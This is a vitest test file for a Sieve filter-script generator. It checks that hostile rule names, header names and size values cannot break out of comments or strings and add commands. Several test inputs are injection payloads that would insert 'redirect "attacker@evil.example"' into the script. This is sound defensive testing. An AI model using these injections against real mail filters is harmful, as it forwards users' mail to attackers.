import { describe, it, expect } from 'vitest';
import { generateScript } from '../generator';
import { parseScript } from '../parser';
import type { FilterRule } from '@/lib/jmap/sieve-types';

// Rule names and a few condition fields went into the script unescaped:
// a "*/" in a name closed the metadata comment, a line break left the
// "# Rule:" comment, and a header name or size value could close its
// string or number and add commands. Rules arrive from plugins with
// filters:write and from imported filter sets, not only from the editor.

function rule(overrides: Partial<FilterRule> = {}): FilterRule {
  return {
    id: 'r1',
    name: 'Receipts',
    enabled: true,
    matchType: 'all',
    conditions: [{ field: 'subject', comparator: 'contains', value: 'receipt' }],
    actions: [{ type: 'mark_read' }],
    stopProcessing: false,
    ...overrides,
  };
}

/** The script with every comment removed: what Sieve actually executes. */
function commands(script: string): string {
  return script.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*#.*$/gm, '');
}

describe('generateScript with hostile rule data', () => {
  it('keeps a "*/" in a rule name inside the metadata comment', () => {
    const name = 'Receipts */ redirect "attacker@evil.example"; /* x';
    const script = generateScript([rule({ name })]);
    expect(commands(script)).not.toContain('attacker@evil.example');

    const parsed = parseScript(script);
    expect(parsed.rules[0]?.name).toBe(name);
  });

  it('keeps a multi-line rule name on its comment line', () => {
    const script = generateScript([rule({ name: 'Receipts\nredirect "attacker@evil.example";' })]);
    expect(commands(script)).not.toContain('attacker@evil.example');
    expect(script).toContain('# Rule: Receipts redirect');
  });

  it('escapes a custom header name', () => {
    const script = generateScript([rule({
      conditions: [{ field: 'header', headerName: 'X-A" "b', comparator: 'contains', value: 'z' }],
    })]);
    expect(script).toContain('header :contains "X-A\\" \\"b" "z"');
  });

  it('refuses a size that is not a number', () => {
    const script = generateScript([rule({
      conditions: [{ field: 'size', comparator: 'greater_than', value: '1 { redirect "attacker@evil.example"; } if true' }],
    })]);
    expect(commands(script)).not.toContain('attacker@evil.example');
    expect(script).toContain('size :over 0');
  });

  it('keeps a size with a quantifier', () => {
    const script = generateScript([rule({
      conditions: [{ field: 'size', comparator: 'greater_than', value: '10M' }],
    })]);
    expect(script).toContain('size :over 10M');
  });
});
